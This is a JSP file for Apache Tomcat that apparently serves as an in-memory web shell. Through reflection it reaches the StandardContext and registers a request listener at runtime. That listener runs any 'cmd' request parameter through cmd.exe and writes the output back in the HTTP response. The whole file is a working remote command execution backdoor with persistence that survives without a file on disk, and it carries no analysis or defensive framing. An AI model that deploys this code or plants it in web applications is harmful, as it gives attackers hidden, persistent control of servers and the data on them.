<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>

<%!
    public class MyListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(out);
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

<%
    //反射创建servletContext
    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);
    //反射创建applicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeContext.get(applicationContextFacade);
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);
    //反射创建standardContext
    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);
    MyListener listenerDemo = new MyListener();
    standardContext.addApplicationEventListener(listenerDemo);
%>